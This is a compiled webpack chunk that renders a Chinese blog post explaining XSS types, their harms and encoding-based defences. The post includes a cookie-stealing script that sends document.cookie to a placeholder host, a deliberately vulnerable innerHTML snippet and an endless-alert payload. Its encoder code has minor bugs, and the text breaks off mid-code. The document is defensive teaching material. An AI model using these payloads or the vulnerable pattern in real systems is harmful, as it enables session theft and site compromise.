(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{455:function(t,s,a){"use strict";a.r(s);var n=a(19),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h2",{attrs:{id:"_0-前言"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0-前言"}},[t._v("#")]),t._v(" 0.前言")]),t._v(" "),a("p",[t._v("与前端有关的两个网络安全问题，分别是 "),a("code",[t._v("XSS")]),t._v(" 与 "),a("code",[t._v("CSRF")]),t._v("。")]),t._v(" "),a("p",[t._v("正好最近在项目中看到了一个 "),a("code",[t._v("xss.js")]),t._v(" 文件，该文件中主要包含 "),a("code",[t._v("htmlEncode")]),t._v(" 及 "),a("code",[t._v("htmlDecode")]),t._v(" 两个函数。其中的转义方案很巧妙，于是随手记录下来。")]),t._v(" "),a("h2",{attrs:{id:"_1-xss-的定义"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-xss-的定义"}},[t._v("#")]),t._v(" 1. XSS 的定义")]),t._v(" "),a("p",[t._v("全称："),a("code",[t._v("XSS（Cross Site Scripting）")]),t._v(" 跨站脚本攻击。")]),t._v(" "),a("p",[t._v("攻击方式：在用户浏览器上，在渲染 "),a("code",[t._v("DOM")]),t._v(" 树时，执行了不可预期的 "),a("code",[t._v("JS")]),t._v(" 脚本，从而引发了安全问题。")]),t._v(" "),a("blockquote",[a("p",[t._v("以下部分见："),a("a",{attrs:{href:"https://blog.csdn.net/qq_26599807/article/details/127790481",target:"_blank",rel:"noopener noreferrer"}},[t._v("XSS攻击及防御（简单易懂）"),a("OutboundLink")],1)])]),t._v(" "),a("p",[t._v("按照攻击路径可分为如下类型：")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("反射型 "),a("code",[t._v("XSS")])]),t._v(" "),a("p",[t._v("数据走向为："),a("code",[t._v("浏览器")]),t._v("—>"),a("code",[t._v("后端回显")]),t._v("—>"),a("code",[t._v("浏览器")]),t._v("，故称为"),a("code",[t._v("反射型")]),t._v("。")]),t._v(" "),a("p",[t._v("攻击特性：一次性。")])]),t._v(" "),a("li",[a("p",[t._v("存储型 "),a("code",[t._v("XSS")])]),t._v(" "),a("p",[t._v("数据走向为："),a("code",[t._v("浏览器")]),t._v("—>"),a("code",[t._v("后端")]),t._v("—>"),a("code",[t._v("数据库")]),t._v("—>"),a("code",[t._v("后端")]),t._v("—>"),a("code",[t._v("浏览器")]),t._v("。")]),t._v(" "),a("p",[t._v("攻击范围：群体攻击，危害性极大。")]),t._v(" "),a("p",[t._v("典型场景：任何可能插入数据库的地方，如用户注册，评论区、留言板、上传文件的文件名。")])]),t._v(" "),a("li",[a("p",[a("code",[t._v("DOM")]),t._v(" 型 "),a("code",[t._v("XSS")])]),t._v(" "),a("p",[t._v("数据走向为："),a("code",[t._v("URL")]),t._v(" —> "),a("code",[t._v("浏览器")])]),t._v(" "),a("p",[t._v("特点：不会经过后端，就是使用页面本地的 "),a("code",[t._v("js")]),t._v(" 去执行一段代码。")]),t._v(" "),a("p",[t._v("典型场景："),a("code",[t._v("JSON转换")]),t._v("、"),a("code",[t._v("翻译等工具区")]),t._v("。")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("test")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n      "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("getElementById")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"text"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("value"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n      document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("getElementById")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"t"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("innerHTML "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<a href=\'"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("str"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\' >testLink</a>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n/* 翻译显示内容*/\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n/* 输入待翻译的文本 */\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n/* 执行翻译 */\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("button")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("onclick")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("test()"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br")])])])]),t._v(" "),a("h2",{attrs:{id:"_2-攻击危害"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-攻击危害"}},[t._v("#")]),t._v(" 2.攻击危害")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("盗取 "),a("code",[t._v("cookie")]),t._v(" 信息")]),t._v(" "),a("p",[t._v("如注入：")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("window"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("“www"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("bbb"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("param"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("”"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")])])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])])]),t._v(" "),a("li",[a("p",[t._v("影响用户体验")]),t._v(" "),a("p",[t._v("如：恶意跳转，以及无法关闭的弹窗")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("while")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"无法关闭此弹窗！"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])])]),t._v(" "),a("li",[a("p",[t._v("按键记录和钓鱼")])]),t._v(" "),a("li",[a("p",[t._v("未授权操作")]),t._v(" "),a("ul",[a("li",[t._v("利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如不适当的投票。")]),t._v(" "),a("li",[t._v("以被攻击者的身份执行一些管理操作。")])])])]),t._v(" "),a("h2",{attrs:{id:"_3-如何防御-xss-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-如何防御-xss-攻击"}},[t._v("#")]),t._v(" 3.如何防御 "),a("code",[t._v("XSS")]),t._v(" 攻击")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("对用户输入的内容，必须进行 "),a("code",[t._v("en-code")]),t._v(" 操作，避免出现 "),a("code",[t._v("HTML Tag")])]),t._v(" "),a("p",[a("code",[t._v("HTML")]),t._v(" 字符进行编码：利用"),a("code",[t._v("html")]),t._v(" 特性：利用 "),a("code",[t._v("innerText")]),t._v(" 输入，再 "),a("code",[t._v("innerHTML")]),t._v(" 输出。")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* 对 html 元素进行编码 */")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlEncode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("test")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* 当 text 是对象，且不为 null 时 */")]),t._v("  \n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("===")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"object"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" _text "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" key "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n      _text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("key"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlEncode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("key"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* 当 text 是字符串时 */")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* 构造一个div(可换成任何一个html元素)，主要是利用 div.innerText 的属性*/")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" div "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("createElement")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"div"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* 先 div.innerText 设置*/")]),t._v("\n  div"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("innerText "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" text； "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 如：<div>123</div>")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" div"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("innerHTML"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 会自动对 <,> 等字符进行转译，如：'&lt;div&gt;123&lt;/div&gt;'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br"),a("span",{staticClass:"line-number"},[t._v("15")]),a("br"),a("span",{staticClass:"line-number"},[t._v("16")]),a("br")])]),a("p",[a("code",[t._v("HTML")]),t._v(" 字符进行解码：")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlDecode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("text")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" text "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("===")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"object"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" key "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n      text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("key"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlDecode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("key"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("typeof")]),t._v(" text "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("===")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"string"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// (底层实现)方案一：将编码文本转译为 `HTML Tag`")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// text = text")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//       .replace(/&quot;/g,'\"\"') // 双引号")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//       .replace(/&acute;/g,\"''\") // 左单引号")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//     \t.replace(/&#27;/g, \"''\") // 右单引号")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&#60;/g, "`") // 反引号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&lt;/g, "<") // 左尖括号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&gt;/g, ">") // 右尖括号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&middot;/g,".") // 点')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&amp;/g, "&") // ')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&iexcl;/g, "?") // 问号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&#x7bl;&#xd;&xa;/g，"{") // 左括号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&#xd;&#xa;&x7d;/g,"}") // 右括号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&#x3a;/g,":") // 冒号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&#x5b;/g, "[") // 左方括号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/&#x5d;/g, "]") // 右方括号')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//       .replace(/\\\\\\\\\\/g, "\\\\"); // 反斜杠')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//     text = decodeURIComponent(xss.escapeHtmlEntities(text));")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" div "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("createElement")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"div"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    text "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&lt;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&gt;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    div"),a("span",{pre:!0,attrs:{class:"token 